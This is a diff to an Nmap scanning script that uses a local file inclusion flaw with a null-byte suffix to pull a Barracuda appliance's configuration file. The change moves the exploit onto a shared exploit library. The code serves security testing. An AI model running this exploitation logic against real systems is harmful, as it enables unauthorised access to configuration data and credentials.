@@ -75,12 +75,12 @@ http://www.exploit-db.com/exploits/15130/
 --            - looped path detection
 -- 2011-06-15 - looped system info extraction
 --            - changed service portrule to "barracuda"
+-- 2017-07-24 - changed to use new exploit.lua library
 --
 
 author = "Brendan Coles"
 license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"intrusive", "exploit", "auth"}
-
 
 portrule = shortport.port_or_service (8000, "barracuda", {"tcp"})
 
@@ -100,18 +100,18 @@ action = function(host, port)
 
     -- Retrieve file
     local data = http.get(host, port, tostring(path))
-    if data and data.status then
+    if (data and data.status) then
 
       -- Check if file exists
       stdnse.debug1("HTTP %s: %s", data.status, tostring(path))
       if tostring(data.status):match("200") then
 
         -- Attempt config file retrieval with LFI exploit
-        stdnse.debug1("Exploiting: %s", tostring(path .. payload))
-        local status, lfi_success, data = exploit.lfi_check(host, port, payload, file, nil, nil, '%00')
-        data = http.get(host, port, tostring(path .. payload))
-        if data and string.match(data, "DROP TABLE IF EXISTS config;") and  string.match(data.body, "barracuda%.css") then
-          config_file = data.body
+        local c_payload = path .. payload
+        stdnse.debug1("Exploiting: %s", tostring(c_payload))
+        local status, lfi_success, data = exploit.lfi_check(host, port, c_payload, file, nil, nil, '%00')
+        if data and string.match(data, "DROP TABLE IF EXISTS config;") and  string.match(data, "barracuda%.css") then
+          config_file = data
           break
         end
       end
